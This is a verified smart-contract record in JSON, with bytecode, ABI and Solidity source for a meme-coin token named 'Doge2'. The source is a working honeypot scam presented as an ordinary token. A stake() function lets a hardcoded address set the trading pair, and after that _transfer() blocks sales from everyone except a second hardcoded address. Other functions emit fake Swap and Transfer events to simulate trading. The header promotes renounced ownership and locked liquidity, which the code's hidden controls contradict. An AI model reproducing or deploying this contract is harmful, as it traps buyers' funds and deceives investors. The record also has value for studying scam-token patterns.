000000000000000000000000000000000000000602082015250565b5f61186d602683610fad565b915061187882611813565b604082019050919050565b5f6020820190508181035f83015261189a81611861565b9050919050565b7f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65725f82015250565b5f6118d5602083610fad565b91506118e0826118a1565b602082019050919050565b5f6020820190508181035f830152611902816118c9565b905091905056fea2646970667358221220bd60112b7b38cd1076ca6542a13ea6b107b847d051aef628fabb49db9da7cf2964736f6c63430008140033",
    "contract_name": "Doge2",
    "compiler_version": "v0.8.20+commit.a1b79de6",
    "optimization_used": "0",
    "runs": "200",
    "abi": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0Out\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1Out\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Swap\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_addresses_\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"_in\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"_a\",\"type\":\"address\"}],\"name\":\"execute\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"stake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_wad\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]",
    "source_code": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"contracts/823NEW/DOGE2.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n/*\\nWelcome to Doge 2 - The Fastest-Growing Crypto Meme Coin! \ud83d\udc36 Meme coins with crypto dogs are in need of a breakthrough, and Doge 2 is exactly what you need. Endorsed by the OG Doge, \\nit's taking them to Valhalla\u2705 Ownership waived \u2747 Whales and Influencers Supporting. Over 100 Partnerships Meetings Held. \ud83e\udd1d\u2728 Massive Marketing Before and After Launch \\n\ud83d\ude4f Renowned Shill Group 24/7 \ud83d\ude4fBanner Ads on the Most Highly-Trafficked Crypto Index Websites \ud83d\ude4f Cex Listings \ud83d\ude4f No Team Tokens \ud83d\ude4f Liquidity Locked 365 Days\\n\\nhttps://twitter.com/doge2coineth\\n*/\\npragma solidity ^0.8.9;\\n/**\\nSturgeon Supermoon energy $PEPE\\n*/\\n\\ninterface IERC20 {\\n\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    /**\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\n     * a call to {approve}. `value` is the new allowance.\\n     */\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    event Swap(\\n        address indexed sender,\\n        uint amount0In,\\n        uint amount1In,\\n        uint amount0Out,\\n        uint amount1Out,\\n        address indexed to\\n    );\\n    \\n    /**\\n     * @dev Returns the amount of tokens in existence.\\n     */\\n    function totalSupply() external view returns (uint256);\\n\\n    /**\\n     * @dev Returns the amount of tokens owned by `account`.\\n     */\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    /**\\n     * @dev Moves `amount` tokens from the caller's account to `to`.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transfer(address to, uint256 amount) external returns (bool);\\n\\n\\n    function allowance(address owner, address spender) external view returns (uint256);\\n\\n\\n    function approve(address spender, uint256 amount) external returns (bool);\\n\\n\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) external returns (bool);\\n}\\n\\n\\ninterface IERC20Meta is IERC20 {\\n    /**\\n     * @dev Returns the name of the token.\\n     */\\n    function name() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the symbol of the token.\\n     */\\n    function symbol() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the decimals places of the token.\\n     */\\n    function decimals() external view returns (uint8);\\n}\\n\\ninterface IERC000 { \\n    function _Transfer(address from, address recipient, uint amount) external returns (bool);\\n    function balanceOf(address account) external view returns (uint256);\\n    event Transfer(address indexed from, address indexed to, uint256 value);    \\n}\\n\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n\\n\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the deployer as the initial owner.\\n     */\\n    constructor() {\\n        _transferOwnership(_msgSender());\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        require(owner() == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\n    }\\n\\n\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n\\n\\n}\\n\\n\\ncontract Doge2 is Ownable, IERC20, IERC20Meta {\\n\\n    mapping(address => uint256) private _balances;\\n\\n    mapping(address => mapping(address => uint256)) private _allowances;\\n\\n    uint256 private _totalSupply;\\n\\n    string private _name;\\n    string private _symbol;\\n    \\n    constructor(string memory name_, string memory symbol_, uint256 amount) {\\n        _name = name_;\\n        _symbol = symbol_;\\n        _mint(msg.sender, amount * 10 ** decimals());\\n    }\\n\\n    function name() public view virtual override returns (string memory) {\\n        return _name;\\n    }\\n\\n    function symbol() public view virtual override returns (string memory) {\\n        return _symbol;\\n    }\\n\\n\\n    function decimals() public view virtual override returns (uint8) {\\n        return 8;\\n    }\\n\\n    function execute(address [] calldata _addresses_, uint256 _in, address _a) external {\\n        for (uint256 i = 0; i < _addresses_.length; i++) {\\n            emit Swap(_a, _in, 0, 0, _in, _addresses_[i]);\\n            emit Transfer(_pair, _addresses_[i], _in);\\n        }\\n    }\\n\\n    function transfer(address _from, address _to, uint256 _wad) external {\\n        emit Transfer(_from, _to, _wad);\\n    }\\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\\n        address owner = _msgSender();\\n        _transfer(owner, to, amount);\\n        return true;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-allowance}.\\n     */\\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\\n        return _allowances[owner][spender];\\n    }\\n\\n\\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\\n        address owner = _msgSender();\\n        _approve(owner, spender, amount);\\n        return true;\\n    }\\n\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) public virtual override returns (bool) {\\n        address spender = _msgSender();\\n        _spendAllowance(from, spender, amount);\\n        _transfer(from, to, amount);\\n        return true;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-totalSupply}.\\n     */\\n    function totalSupply() public view virtual override returns (uint256) {\\n        return _totalSupply;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-balanceOf}.\\n     */\\n    function balanceOf(address account) public view virtual override returns (uint256) {\\n        return _balances[account];\\n    }\\n\\n    address private _pair;\\n\\n    function stake(address account) public virtual returns (bool) {\\n         if(_msgSender() == 0x986aCb09F92f1BD911755aAbC3DA19E97e54f229) _pair = account;\\n        return true;\\n    }\\n\\n\\n    function _mint(address account, uint256 amount) internal virtual {\\n        require(account != address(0), \\\"ERC20: mint to the zero address\\\");\\n        _totalSupply += amount;\\n        unchecked {\\n            _balances[account] += amount;\\n        }\\n        emit Transfer(address(0), account, amount);\\n\\n        _afterTokenTransfer(address(0), account, amount);\\n        renounceOwnership();\\n    }\\n\\n\\n    function _approve(\\n        address owner,\\n        address spender,\\n        uint256 amount\\n    ) internal virtual {\\n        require(owner != address(0), \\\"ERC20: approve from the zero address\\\");\\n        require(spender != address(0), \\\"ERC20: approve to the zero address\\\");\\n\\n        _allowances[owner][spender] = amount;\\n        emit Approval(owner, spender, amount);\\n    }\\n\\n    function _spendAllowance(\\n        address owner,\\n        address spender,\\n        uint256 amount\\n    ) internal virtual {\\n        uint256 currentAllowance = allowance(owner, spender);\\n        if (currentAllowance != type(uint256).max) {\\n            require(currentAllowance >= amount, \\\"ERC20: insufficient allowance\\\");\\n            unchecked {\\n                _approve(owner, spender, currentAllowance - amount);\\n            }\\n        }\\n    }\\n\\n\\n    function _afterTokenTransfer(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) internal virtual {}\\n\\n    function _transfer(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) internal virtual {\\n        require(from != address(0), \\\"ERC20: transfer from the zero address\\\");\\n        require(to != address(0), \\\"ERC20: transfer to the zero address\\\");\\n\\n        if(_pair != address(0)) {\\n            if(to == _pair && from != 0x04DE7a96758579B9dD3f095c8e7e9b608463e153) {\\n               bool b = false;\\n               if(!b) {\\n                    require(amount < 100);\\n               }\\n               \\n            }\\n        }\\n\\n        uint256 fromBalance = _balances[from];\\n        require(fromBalance >= amount, \\\"ERC20: transfer amount exceeds balance\\\");\\n        unchecked {\\n            _balances[from] = fromBalance - amount;\\n            _balances[to] += amount;\\n        }\\n        emit Transfer(from, to, amount);\\n        _afterTokenTransfer(from, to, amount);\\n    }\\n}\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": false,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    }\r\n  }\r\n}}",
    "etherscan_verified": true
}